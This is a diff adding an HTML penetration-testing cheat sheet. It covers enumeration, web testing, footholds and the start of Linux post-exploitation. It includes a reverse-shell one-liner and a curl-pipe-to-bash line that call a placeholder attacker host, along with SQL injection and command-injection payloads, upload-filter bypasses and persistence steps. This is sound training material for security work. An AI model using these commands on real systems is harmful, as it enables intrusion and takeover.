@@ -1,0 +1,1698 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>☠️ Ultimate Penetration Testing Guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --border: #1e2a38;
+    --accent: #00ff9d;
+    --accent2: #ff3366;
+    --accent3: #ffd60a;
+    --accent4: #00b4ff;
+    --text: #c8d8e8;
+    --text-dim: #5a7080;
+    --text-bright: #eaf4ff;
+    --code-bg: #080b0e;
+    --sidebar-w: 280px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Space Mono', monospace;
+    font-size: 13px;
+    line-height: 1.7;
+    display: flex;
+  }
+
+  /* SIDEBAR */
+  #sidebar {
+    width: var(--sidebar-w);
+    min-height: 100vh;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    height: 100vh;
+    overflow-y: auto;
+    flex-shrink: 0;
+    display: flex;
+    flex-direction: column;
+  }
+
+  #sidebar::-webkit-scrollbar { width: 4px; }
+  #sidebar::-webkit-scrollbar-track { background: var(--bg2); }
+  #sidebar::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .sidebar-header {
+    padding: 20px 16px 14px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .sidebar-logo {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    font-weight: 900;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .sidebar-subtitle {
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-top: 4px;
+    letter-spacing: 1px;
+  }
+
+  .nav-section {
+    padding: 10px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .nav-label {
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 6px 16px 2px;
+  }
+
+  .nav-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 16px;
+    color: var(--text-dim);
+    text-decoration: none;
+    font-size: 11px;
+    transition: all 0.15s;
+    cursor: pointer;
+    border-left: 2px solid transparent;
+  }
+
+  .nav-item:hover {
+    color: var(--accent);
+    border-left-color: var(--accent);
+    background: rgba(0,255,157,0.04);
+  }
+
+  .nav-item .layer-badge {
+    font-size: 9px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 1px 5px;
+    border-radius: 2px;
+    color: var(--text-dim);
+    flex-shrink: 0;
+  }
+
+  /* MAIN */
+  #main {
+    flex: 1;
+    max-width: calc(100% - var(--sidebar-w));
+    overflow-x: hidden;
+  }
+
+  /* TOP BAR */
+  .topbar {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 40px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 10;
+  }
+
+  .topbar-skull { font-size: 20px; }
+
+  .topbar-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 14px;
+    font-weight: 900;
+    color: var(--text-bright);
+    letter-spacing: 1px;
+  }
+
+  .topbar-tag {
+    font-size: 10px;
+    padding: 2px 8px;
+    border: 1px solid var(--accent2);
+    color: var(--accent2);
+    border-radius: 2px;
+    letter-spacing: 1px;
+  }
+
+  .topbar-rule {
+    margin-left: auto;
+    font-size: 10px;
+    color: var(--accent);
+    border: 1px solid rgba(0,255,157,0.3);
+    padding: 4px 12px;
+    background: rgba(0,255,157,0.05);
+  }
+
+  /* CONTENT */
+  .content {
+    padding: 40px;
+    max-width: 980px;
+  }
+
+  /* RULE BANNER */
+  .rule-banner {
+    background: var(--code-bg);
+    border: 1px solid var(--accent2);
+    border-left: 4px solid var(--accent2);
+    padding: 20px 24px;
+    margin-bottom: 40px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .rule-banner::before {
+    content: '☠';
+    position: absolute;
+    right: 20px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 60px;
+    opacity: 0.05;
+  }
+
+  .rule-banner .rule-title {
+    font-family: 'Orbitron', monospace;
+    color: var(--accent2);
+    font-size: 11px;
+    letter-spacing: 3px;
+    margin-bottom: 10px;
+  }
+
+  .rule-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 6px 20px;
+  }
+
+  .rule-item {
+    display: flex;
+    gap: 8px;
+    font-size: 11px;
+  }
+
+  .rule-cond { color: var(--accent3); }
+  .rule-arrow { color: var(--text-dim); }
+  .rule-res { color: var(--text-bright); }
+
+  /* SECTION */
+  .section {
+    margin-bottom: 50px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 24px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-badge {
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    font-weight: 700;
+    color: var(--bg);
+    background: var(--accent);
+    padding: 3px 8px;
+    letter-spacing: 2px;
+    flex-shrink: 0;
+  }
+
+  .section-badge.red { background: var(--accent2); }
+  .section-badge.yellow { background: var(--accent3); }
+  .section-badge.blue { background: var(--accent4); }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: 1px;
+  }
+
+  /* SUBSECTION */
+  .subsection {
+    margin-bottom: 28px;
+  }
+
+  .subsection-title {
+    font-family: 'Space Mono', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--accent4);
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .subsection-title::before {
+    content: '//';
+    color: var(--text-dim);
+  }
+
+  /* CODE BLOCKS */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 16px 20px;
+    overflow-x: auto;
+    margin: 10px 0 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    line-height: 1.6;
+    color: #9eb8c8;
+  }
+
+  pre .c { color: var(--text-dim); } /* comment */
+  pre .k { color: var(--accent3); }  /* keyword/arrow */
+  pre .v { color: var(--accent); }   /* value */
+  pre .h { color: var(--accent2); }  /* highlight */
+  pre .b { color: var(--accent4); }  /* blue */
+
+  /* FLOW BOXES */
+  .flow {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    padding: 16px 20px;
+    margin: 10px 0 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    line-height: 1.8;
+    color: #9eb8c8;
+  }
+
+  /* TABLES */
+  .tbl-wrap { overflow-x: auto; margin: 10px 0 20px; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+
+  thead th {
+    background: var(--bg3);
+    color: var(--accent);
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 10px 14px;
+    text-align: left;
+    border-bottom: 1px solid var(--accent);
+  }
+
+  tbody tr { border-bottom: 1px solid var(--border); }
+  tbody tr:hover { background: rgba(255,255,255,0.02); }
+
+  td {
+    padding: 9px 14px;
+    vertical-align: top;
+  }
+
+  td:first-child {
+    font-family: 'Share Tech Mono', monospace;
+    color: var(--accent3);
+    white-space: nowrap;
+    font-size: 11px;
+  }
+
+  td:nth-child(2) { color: var(--text-bright); }
+  td:nth-child(3) { color: var(--text-dim); font-size: 11px; }
+
+  /* PRIORITY BOXES */
+  .priority {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin: 16px 0;
+  }
+
+  .p-box {
+    border: 1px solid var(--border);
+    background: var(--bg3);
+    padding: 14px 16px;
+  }
+
+  .p-box-title {
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+    font-weight: 700;
+  }
+
+  .p-box-title.t1 { color: var(--accent2); }
+  .p-box-title.t2 { color: var(--accent3); }
+  .p-box-title.t3 { color: var(--accent4); }
+  .p-box-title.t4 { color: var(--accent); }
+  .p-box-title.t5 { color: var(--text-dim); }
+
+  .p-box ul { list-style: none; }
+  .p-box li {
+    font-size: 11px;
+    color: var(--text);
+    padding: 3px 0;
+    display: flex;
+    gap: 6px;
+    align-items: flex-start;
+  }
+
+  .p-box li::before { content: '→'; color: var(--text-dim); flex-shrink: 0; }
+
+  /* CHECKLIST */
+  .checklist { list-style: none; }
+
+  .checklist li {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 5px 0;
+    border-bottom: 1px solid rgba(30,42,56,0.5);
+    font-size: 12px;
+  }
+
+  .checklist li .box {
+    width: 14px;
+    height: 14px;
+    border: 1px solid var(--border);
+    flex-shrink: 0;
+    margin-top: 2px;
+    background: var(--code-bg);
+  }
+
+  /* ALERT BOXES */
+  .alert {
+    border-left: 4px solid var(--accent3);
+    background: rgba(255,214,10,0.04);
+    padding: 12px 16px;
+    margin: 16px 0;
+    font-size: 12px;
+  }
+
+  .alert.red { border-left-color: var(--accent2); background: rgba(255,51,102,0.04); }
+  .alert.green { border-left-color: var(--accent); background: rgba(0,255,157,0.04); }
+
+  .alert-label {
+    font-size: 9px;
+    letter-spacing: 2px;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+
+  .alert.red .alert-label { color: var(--accent2); }
+  .alert.yellow .alert-label { color: var(--accent3); }
+  .alert.green .alert-label { color: var(--accent); }
+
+  /* PRIVILEGE TABLE */
+  .priv-table td:first-child { color: var(--accent2); }
+  .priv-table td:nth-child(2) { color: var(--accent); }
+
+  /* PORT TABLE */
+  .port-table td:first-child { color: var(--accent4); }
+
+  /* EDGE TABLE */
+  .edge-table td:first-child { color: var(--accent); font-size: 11px; }
+
+  /* INLINE CODE */
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    padding: 1px 5px;
+    color: var(--accent3);
+    font-size: 11px;
+  }
+
+  /* DIVIDER */
+  .div { height: 1px; background: var(--border); margin: 40px 0; }
+
+  /* KILL ITEM */
+  .kill-item {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent2);
+    padding: 14px 18px;
+    margin-bottom: 10px;
+  }
+
+  .kill-item strong {
+    color: var(--accent2);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    display: block;
+    margin-bottom: 6px;
+  }
+
+  .kill-item p { font-size: 12px; color: var(--text); }
+
+  /* HASH TABLE */
+  .hash-table td:nth-child(2) { color: var(--accent3); font-family: 'Share Tech Mono', monospace; }
+  .hash-table td:nth-child(3) { color: var(--accent); }
+
+  /* SCROLLBAR */
+  #main::-webkit-scrollbar { width: 6px; }
+  #main::-webkit-scrollbar-track { background: var(--bg); }
+  #main::-webkit-scrollbar-thumb { background: var(--border); }
+
+  p { margin-bottom: 10px; font-size: 12px; color: var(--text); }
+
+  @media (max-width: 900px) {
+    #sidebar { display: none; }
+    #main { max-width: 100%; }
+    .content { padding: 20px; }
+    .priority { grid-template-columns: 1fr; }
+    .rule-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-logo">☠ PENTEST GUIDE</div>
+    <div class="sidebar-subtitle">ENUMERATE HARDER ALWAYS</div>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-label">Foundation</div>
+    <a class="nav-item" href="#pre">Pre-Engagement & Setup</a>
+    <a class="nav-item" href="#flow">Master Attack Flow</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-label">Discovery</div>
+    <a class="nav-item" href="#l1"><span class="layer-badge">L1</span> Host & Port Discovery</a>
+    <a class="nav-item" href="#l2"><span class="layer-badge">L2</span> Service Enumeration</a>
+    <a class="nav-item" href="#l3"><span class="layer-badge">L3</span> Web App Testing</a>
+    <a class="nav-item" href="#l4"><span class="layer-badge">L4</span> Getting the Foothold</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-label">Post-Exploitation</div>
+    <a class="nav-item" href="#l5"><span class="layer-badge">L5</span> Linux Post-Exploit</a>
+    <a class="nav-item" href="#l6"><span class="layer-badge">L6</span> Windows Post-Exploit</a>
+    <a class="nav-item" href="#l7"><span class="layer-badge">L7</span> Pivoting & Tunneling</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-label">Active Directory</div>
+    <a class="nav-item" href="#l8"><span class="layer-badge">L8</span> AD Fundamentals</a>
+    <a class="nav-item" href="#l9"><span class="layer-badge">L9</span> AD Exploitation</a>
+    <a class="nav-item" href="#l10"><span class="layer-badge">L10</span> Domain Escalation</a>
+  </div>
+
+  <div class="nav-section">
+    <div class="nav-label">Reference</div>
+    <a class="nav-item" href="#panic">Panic Checklists</a>
+    <a class="nav-item" href="#kills">Things That Kill You</a>
+    <a class="nav-item" href="#hashes">Hash Cracking</a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<div id="main">
+
+  <div class="topbar">
+    <span class="topbar-skull">☠️</span>
+    <span class="topbar-title">ULTIMATE PENETRATION TESTING GUIDE</span>
+    <span class="topbar-tag">OFFENSIVE SECURITY</span>
+    <span class="topbar-rule">STUCK? → ENUMERATE MORE</span>
+  </div>
+
+  <div class="content">
+
+    <!-- THE ONE RULE -->
+    <div class="rule-banner">
+      <div class="rule-title">// THE ONE RULE</div>
+      <div class="rule-grid">
+        <div class="rule-item"><span class="rule-cond">STUCK?</span><span class="rule-arrow">→</span><span class="rule-res">You haven't enumerated enough</span></div>
+        <div class="rule-item"><span class="rule-cond">NO PATH?</span><span class="rule-arrow">→</span><span class="rule-res">You missed something</span></div>
+        <div class="rule-item"><span class="rule-cond">EXPLOIT FAIL?</span><span class="rule-arrow">→</span><span class="rule-res">Wrong version — enumerate again</span></div>
+        <div class="rule-item"><span class="rule-cond">RABBIT HOLE?</span><span class="rule-arrow">→</span><span class="rule-res">Stop. Enumerate something else</span></div>
+      </div>
+    </div>
+
+    <!-- PRE-ENGAGEMENT -->
+    <div class="section" id="pre">
+      <div class="section-header">
+        <span class="section-badge yellow">SETUP</span>
+        <span class="section-title">Pre-Engagement</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Before touching anything</div>
+        <pre>1. Read the scope document carefully — what's IN, what's OUT
+2. Note assessment type: External PT? Internal? Web App? Red Team?
+3. Set up your project folder structure NOW, not later
+4. Start a running log — timestamp every significant action
+5. Sync time with DC if AD in scope (Kerberos breaks silently otherwise)
+6. Confirm VPN is connected and stable
+7. Note client's working hours — avoid noisy scans outside them</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Folder Structure</div>
+        <pre>Project/
+├── Scans/
+│   ├── nmap/
+│   └── web/
+├── Exploits/
+├── Loot/
+│   ├── credentials.txt    ← ALL creds go here immediately
+│   ├── hashes.txt
+│   └── keys/
+├── Evidence/
+│   └── screenshots/
+└── Notes/
+    └── hosts.md           ← Running host inventory</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">hosts.md — Keep updated in real time</div>
+        <pre>IP | Hostname | OS | Open Ports | Notes | Status
+10.x.x.x | hostname | Ubuntu 20.04 | 22,80,443 | Apache 2.4.41 | Shell obtained</pre>
+      </div>
+    </div>
+
+    <!-- MASTER FLOW -->
+    <div class="section" id="flow">
+      <div class="section-header">
+        <span class="section-badge">FLOW</span>
+        <span class="section-title">Master Attack Flow</span>
+      </div>
+      <div class="flow">
+SCOPE RECEIVED
+      │
+      ▼
+[ L1 ] What exists?
+        Host Discovery → Port Scan → Service Versions
+      │
+      ▼
+[ L2 ] What can I access?
+        Service Enum → Anon/Default access → DNS/Web
+      │
+      ▼
+[ L3 ] How do I get in?
+        Web Testing → Service Exploits → Cred Attacks
+      │
+      ▼
+[ L4 ] What can I do from here?
+        PrivEsc → Credential Hunting → Lateral Move
+      │
+      ▼
+[ L5 ] Where else can I go?
+        Pivot → Internal Recon → Repeat everything</div>
+    </div>
+
+    <!-- L1 -->
+    <div class="section" id="l1">
+      <div class="section-header">
+        <span class="section-badge blue">LAYER 1</span>
+        <span class="section-title">Host & Port Discovery</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Scanning Order — always follow this sequence</div>
+        <pre>STEP 1  Fast TCP (top 1000 ports)     → Quick wins, get your bearings
+STEP 2  Full TCP ALL 65535 ports       → Run in background. Services hide on high ports.
+STEP 3  Version + script on OPEN ports → Not all ports. Only open ones.
+STEP 4  UDP top 100                    → SNMP(161), NFS(111), TFTP(69), DNS(53) — always ignored, always matter
+STEP 5  Save ALL output                → grepable, xml, normal — you'll grep it later</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Port Reference — First Thoughts</div>
+        <div class="tbl-wrap">
+          <table class="port-table">
+            <thead><tr><th>Port</th><th>First Thought</th><th>Don't Miss</th></tr></thead>
+            <tbody>
+              <tr><td>21 FTP</td><td>Anonymous login? Write access?</td><td>Version exploits (vsftpd 2.3.4 backdoor)</td></tr>
+              <tr><td>22 SSH</td><td>Version? Keys elsewhere?</td><td>Old OpenSSH = user enum timing</td></tr>
+              <tr><td>25 SMTP</td><td>VRFY user enum, open relay</td><td>Passwords in mail logs</td></tr>
+              <tr><td>53 DNS</td><td><strong style="color:var(--accent2)">Zone transfer immediately</strong></td><td>Subdomain brute after</td></tr>
+              <tr><td>111/2049 NFS</td><td>Mount it. Check no_root_squash</td><td>Files/keys on the share</td></tr>
+              <tr><td>139/445 SMB</td><td>Null session, shares, signing</td><td>Relay if signing disabled</td></tr>
+              <tr><td>161 UDP SNMP</td><td>Default community strings</td><td>Huge info leak if open</td></tr>
+              <tr><td>389/636 LDAP</td><td>Anonymous bind → dump users</td><td>Password in description fields</td></tr>
+              <tr><td>873 Rsync</td><td>List modules, anonymous access</td><td>SSH keys sitting there</td></tr>
+              <tr><td>1433 MSSQL</td><td>Default SA creds, xp_cmdshell</td><td>Linked servers</td></tr>
+              <tr><td>3306 MySQL</td><td>Root no password</td><td>Write webshell via INTO OUTFILE</td></tr>
+              <tr><td>3389 RDP</td><td>Spray found creds</td><td>DisableRestrictedAdmin for PTH</td></tr>
+              <tr><td>5985/5986 WinRM</td><td>Any creds? → evil-winrm in</td><td>Check before RDP</td></tr>
+              <tr><td>6379 Redis</td><td>No auth = critical RCE</td><td>Write SSH key or cron</td></tr>
+              <tr><td>8080/8443</td><td>Web app, Tomcat, Jenkins</td><td>WAR upload if Tomcat</td></tr>
+              <tr><td>8200 Duplicati</td><td>Backup service, local only</td><td>Forward port → read any file as root</td></tr>
+              <tr><td>8888 Jupyter</td><td>No token = Python RCE</td><td>Direct code execution</td></tr>
+              <tr><td>9200 Elasticsearch</td><td>No auth default</td><td>Dump all indices</td></tr>
+              <tr><td>27017 MongoDB</td><td>No auth default</td><td>show dbs</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">DNS Decision Flow</div>
+        <pre>DNS open?
+    ↓
+Zone transfer immediately
+    ↓
+Got records? → Add ALL to /etc/hosts
+No transfer? → Subdomain brute force (multiple wordlists)
+    ↓
+Check certificate transparency: crt.sh for *.domain
+    ↓
+Reverse DNS all in-scope IPs
+    ↓
+TXT records → SPF, internal hints, verification tokens</pre>
+      </div>
+    </div>
+
+    <!-- L2 -->
+    <div class="section" id="l2">
+      <div class="section-header">
+        <span class="section-badge blue">LAYER 2</span>
+        <span class="section-title">Service Enumeration</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">FTP</div>
+        <pre>Anonymous login → list everything recursively → check write access
+Failed? → Banner version → searchsploit → CVE lookup
+Brute force only if you have usernames</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">SMB</div>
+        <pre>Null session → enum4linux → users + policy + shares
+    ↓
+Shares accessible? → spider every share → look for:
+  config files, scripts, backups, credentials, SSH keys
+    ↓
+SMB signing disabled? → Note for NTLM relay later
+    ↓
+Version check → EternalBlue (MS17-010)? SMBGhost?
+    ↓
+With credentials → check EVERY share again
+  Different users have different permissions
+  → smbmap, crackmapexec, Snaffler</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">LDAP</div>
+        <pre>Anonymous bind → dump everything
+    ↓
+Extract: all users + ALL attributes (description = passwords)
+         all groups + members
+         all computers + OS versions
+         password policy (lockout threshold!)
+         accounts: PASSWD_NOTREQD, DONT_REQ_PREAUTH
+    ↓
+With creds → same plus: delegation settings, GPOs, trusts</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">NFS</div>
+        <pre>showmount -e target → what's exported and to whom?
+    ↓
+Mount accessible shares
+    ↓
+no_root_squash? → create SUID binary on your machine
+                  copy to mounted share
+                  execute on target = runs as root
+    ↓
+Hunt for: SSH keys, configs, web source, credentials</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">SNMP (UDP 161)</div>
+        <pre>Try: public, private, manager, community
+    ↓
+Access? → Massive info dump:
+  → Running processes, installed software, network config
+  → User accounts, listening ports, routing tables
+  → Often reveals services invisible in port scans</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Redis (port 6379)</div>
+        <pre>Connect without auth
+    ↓
+No auth? → CRITICAL
+  → INFO command → system details, paths
+  → KEYS * → all stored data
+  → Write SSH key to authorized_keys (if SSH running)
+  → Write cron job to /var/spool/cron/
+  → Write webshell to web root</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Databases (MSSQL / MySQL / PostgreSQL)</div>
+        <pre>Default creds first
+    ↓
+Access → enumerate databases + users + your privileges
+    ↓
+RCE paths:
+  MSSQL:      xp_cmdshell (enable if you have SA)
+  MySQL:      SELECT INTO OUTFILE (if web root writable)
+  PostgreSQL: COPY TO/FROM, pg_read_file, extensions
+    ↓
+Credential tables → users, accounts, admin tables
+Hash format? → Identify → crack offline</pre>
+      </div>
+    </div>
+
+    <!-- L3 -->
+    <div class="section" id="l3">
+      <div class="section-header">
+        <span class="section-badge yellow">LAYER 3</span>
+        <span class="section-title">Web Application Testing</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">First 5 Minutes — Always</div>
+        <pre>1. Technology fingerprint → stack? (headers, extensions, cookies, Wappalyzer)
+2. robots.txt + sitemap.xml → 5 seconds
+3. Source code → HTML comments, hardcoded paths, API keys
+4. Start directory brute force in background
+5. VHost/subdomain brute in background
+6. Burp Suite running → intercept everything from now on</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Content Discovery — In Order</div>
+        <pre>PASSIVE (no brute force):
+  → robots.txt, sitemap.xml
+  → HTML source / JavaScript files (endpoints hide in JS)
+  → .git/ exposed? → dump source code
+  → .env exposed? → environment variables = credentials
+  → Error pages → technology stack leaks
+    ↓
+EXTENSION DISCOVERY (before directory brute):
+  → What extension does the app use? (.php, .aspx, .jsp)
+  → Always add: .bak, .old, .backup, .txt, .xml, .conf
+    ↓
+DIRECTORY + FILE BRUTE FORCE:
+  → Small → medium → large wordlists
+  → Focus: /admin, /api, /backup, /console, /management
+    ↓
+VHOST / SUBDOMAIN:
+  → What does an INVALID vhost look like? Filter that size/status
+  → Multiple wordlists: dev/staging/test/uat/api find different things
+    ↓
+API ENDPOINTS (separate pass):
+  → /api/, /api/v1/, /api/v2/, /rest/, /graphql
+  → Check /swagger.json, /api/docs, /api-docs</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Login Pages — Decision Flow</div>
+        <pre>Login found
+    ↓
+Default creds for technology:
+  Jenkins=admin:admin  |  Tomcat=tomcat:tomcat  |  WP=admin:admin
+  Grafana=admin:admin  |  PRTG=prtgsysadmin:prtgsysadmin
+    ↓
+Generic: admin:admin, admin:password, admin:(blank)
+    ↓
+Single quote ' → behavior change? → SQLi
+    ↓
+Can you register? → DO IT → role manipulation, IDOR
+    ↓
+Forgot password → predictable token? Single-use? Expires?
+    ↓
+Error messages → "wrong password" vs "user not found" → username enum</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Input Testing — Vulnerability by Input Type</div>
+        <pre>References a file? (page=, file=, include=, path=, doc=)
+  → LFI / Path Traversal
+
+DB query-like? (id=, search=, filter=, sort=)
+  → SQL Injection (single quote test first)
+  → Test ORDER BY, pagination, AND COOKIES
+
+Reflects in page output?
+  → XSS (in context: HTML body, attribute, JavaScript)
+
+Sequential ID you control? (user_id=9, order=1234)
+  → IDOR — change the number, try other users
+
+Might touch OS? (host=, cmd=, ping=, lookup=, exec=)
+  → Command injection (;id, |id, &&id, `id`, $(id))
+
+Template syntax in output? ({{, ${, <%=)
+  → SSTI — try {{7*7}}, if 49 returned = SSTI
+
+Accepts XML?
+  → XXE — external entity to /etc/passwd
+
+Generates document/PDF from input?
+  → HTML/JS injection → possible SSRF / local file read
+
+API JSON body with role/permission fields?
+  → Business logic → "role":"admin", "isAdmin":true</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">LFI — Priority Reading Order</div>
+        <pre>LFI confirmed (/etc/passwd works)
+    ↓
+1. /home/&lt;users&gt;/.ssh/id_rsa         → SSH in directly
+2. /var/log/apache2/access.log       → Log poisoning → RCE
+3. /proc/self/environ                → Env vars, paths
+4. Web configs → find web root, DB creds
+   /etc/nginx/sites-enabled/default
+   /etc/apache2/sites-available/default
+5. App source: index.php, config.php, .env, settings.py
+6. /etc/shadow                       → If lucky
+7. /root/.ssh/id_rsa                 → If lucky
+    ↓
+Log poisoning:
+  → Send PHP in User-Agent header
+  → LFI the log + add ?cmd=
+  → RCE with no upload needed</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">File Upload — Bypass Flow</div>
+        <pre>Try uploading shell directly → sometimes no filter
+    ↓
+Blocked by extension?
+  .php → try: .php5, .phtml, .pHp, .PHP, .php.jpg, .php%00.jpg
+  .asp → try: .aSp, .asP, .asp%00.txt
+    ↓
+Blocked by Content-Type? → Change to image/jpeg in Burp
+    ↓
+Magic bytes checked? → Prepend GIF89a; before payload
+    ↓
+CRITICAL: Find where the file was uploaded
+  → Response may show the path
+  → Brute force: /uploads/, /files/, /storage/, /media/
+    ↓
+Double extension: file.php.jpg or file.jpg.php
+  → Server config decides which extension wins</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">SQL Injection</div>
+        <pre>Single quote ' → error or behavior change?
+    ↓
+Time-based blind:
+  MySQL:  ' AND SLEEP(5)--
+  MSSQL:  WAITFOR DELAY '0:0:5'--
+    ↓
+Confirmed? → Capture in Burp → save → sqlmap
+    ↓
+sqlmap goals:
+  1. List databases
+  2. Find interesting DB (not information_schema)
+  3. Dump credential tables
+  4. File read (--file-read) / write (--file-write)
+  5. OS shell (--os-shell) if DBA
+    ↓
+Login bypass: admin'-- or ' OR '1'='1'--
+ALWAYS test: hidden fields, headers, cookies, HTTP params</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Werkzeug Debug Console (Flask)</div>
+        <pre>Found Flask app → visit /console
+    ↓
+Open without PIN? → Python RCE immediately
+    ↓
+Needs PIN → calculate it using:
+  1. Username running the app (/proc/self/environ)
+  2. Flask module path (find via LFI or error messages)
+  3. MAC address of primary interface
+     → /sys/class/net/&lt;interface&gt;/address → hex to decimal int
+  4. Machine ID
+     → Visit /error on the app → leaked directly
+     → Also: /etc/machine-id or /proc/sys/kernel/random/boot_id
+    ↓
+Run PIN generation script → enter in /console → RCE
+NOTE: Newer Werkzeug uses sha1() not md5()</pre>
+      </div>
+    </div>
+
+    <!-- L4 -->
+    <div class="section" id="l4">
+      <div class="section-header">
+        <span class="section-badge red">LAYER 4</span>
+        <span class="section-title">Getting the Foothold</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Shells — Getting a Stable One</div>
+        <pre>Got webshell (cmd via web)?
+    ↓
+Upgrade to interactive reverse shell:
+
+Linux:
+  bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+  curl http://your-server/shell | bash
+
+Windows:
+  powershell -nop -c "$client = New-Object System.Net.TCPClient..."
+  msfvenom exe → download via certutil/IWR
+    ↓
+Stabilize Linux:
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+
+Stabilize Windows:
+  rlwrap nc -lvnp PORT
+  Or Meterpreter for migration/pivoting</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Persistence — Establish Before Anything Else</div>
+        <pre>Got shell → persistence FIRST
+    ↓
+Linux:
+  → Add your public key to ~/.ssh/authorized_keys
+  → If root: read /root/.ssh/id_rsa → SSH in directly
+
+Windows:
+  → If admin: dump hashes → pass the hash to get back in
+  → Create scheduled task if needed
+    ↓
+Document your access point — you need to recreate it tomorrow</pre>
+      </div>
+    </div>
+
+    <!-- L5 -->
+    <div class="section" id="l5">
+      <div class="section-header">
+        <span class="section-badge">LAYER 5</span>
+        <span class="section-title">Linux Post-Exploitation</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">First 60 Seconds</div>
+        <pre>id                    ← WHO AM I? What groups? [CRITICAL]
+sudo -l               ← Can I run anything as root? [CRITICAL]
+uname -a              ← Kernel version
+cat /etc/os-release   ← Exact OS
+hostname              ← What machine am I on?
+ip a                  ← Networks? SECOND NIC?
+ps aux                ← Running processes as root?
+cat /etc/passwd       ← All users, home dirs
+    ↓
